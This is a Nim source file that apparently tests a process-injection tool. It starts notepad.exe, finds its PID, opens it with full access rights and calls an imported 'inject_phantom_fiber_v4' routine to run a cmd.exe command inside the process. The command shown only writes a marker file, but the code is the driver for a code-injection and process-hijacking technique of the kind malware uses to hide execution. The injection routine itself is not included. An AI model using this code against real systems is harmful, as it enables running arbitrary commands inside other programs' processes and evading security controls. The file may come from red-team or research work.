import winim, strutils, osproc, os
import ../kct/kct_core, ../kct/phantom_fiber_v4

proc find_pid(name: string): DWORD =
    var hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if hSnapshot == INVALID_HANDLE_VALUE: return 0
    var pe: PROCESSENTRY32
    pe.dwSize = sizeof(PROCESSENTRY32).DWORD
    if Process32First(hSnapshot, addr pe) != 0:
        while true:
            var exeName = ""
            for x in pe.szExeFile: exeName.add(if x != 0: char(x) else: '\0')
            exeName = exeName.strip(chars={'\0'})
            if exeName.toLowerAscii() == name.toLowerAscii():
                CloseHandle(hSnapshot)
                return pe.th32ProcessID
            if Process32Next(hSnapshot, addr pe) == 0: break
    CloseHandle(hSnapshot)
    return 0

proc main() =
    let processName = "notepad.exe"
    echo "Starting ", processName, " for test..."
    discard startProcess(processName)
    sleep(2000)

    let pid = find_pid(processName)
    if pid == 0:
        echo "Failed to find PID for ", processName
        return

    echo "Targeting ", processName, " (PID: ", pid, ")"
    let hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)
    if hProcess == 0:
        echo "OpenProcess failed"
        return

    let cmd = "cmd.exe /c echo KCT HIJACK SUCCESS > C:\\Users\\Doheon\\Desktop\\kct_test_success.txt"
    echo "Injecting..."
    if inject_phantom_fiber_v4(hProcess, 2, cmd):
        echo "Injection payload deployed. It will trigger soon..."
        sleep(5000)
    else:
        echo "Injection failed."
    CloseHandle(hProcess)

main()
